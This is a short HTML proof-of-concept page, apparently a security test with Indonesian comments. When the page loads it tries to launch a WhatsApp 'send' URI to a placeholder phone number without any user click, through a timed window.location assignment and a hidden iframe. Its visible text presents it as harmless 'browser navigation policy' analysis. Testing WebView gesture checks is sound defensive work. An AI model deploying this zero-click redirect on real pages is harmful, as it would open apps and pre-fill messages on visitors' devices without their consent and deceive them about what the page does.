<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zero-Click Intent Redirect Test</title>
</head>
<body>
    <h3>Analyzing Browser Navigation Policy...</h3>
    <p>Please wait while the environment initializes.</p>

    <script>
        // Simulasi pemicu otomatis tanpa interaksi pengguna (User Gesture Bypass / Zero-Click)
        function triggerIntentBypass() {
            // Target custom scheme handler (misalnya WhatsApp URI scheme atau intent Android)
            const targetUri = "whatsapp://send?phone=+628123456789&text=Automated_Test_Payload";

            try {
                // Metode 1: Manipulasi window.location secara langsung di dalam background timer/async context
                // Beberapa implementasi WebView yang rentan gagal memvalidasi apakah ini berasal dari user gesture asli.
                window.location.href = targetUri;
            } catch (e) {
                console.error("Direct assignment blocked:", e);
            }

            try {
                // Metode 2: Menggunakan iframe tersembunyi untuk memicu registrasi protocol handler eksternal
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = targetUri;
                document.body.appendChild(iframe);
            } catch (e) {
                console.error("Iframe injection blocked:", e);
            }
        }

        // Memicu fungsi secara otomatis setelah delay singkat (mensimulasikan zero-click pada halaman termuat)
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(triggerIntentBypass, 500);
        });
    </script>
</body>
</html>
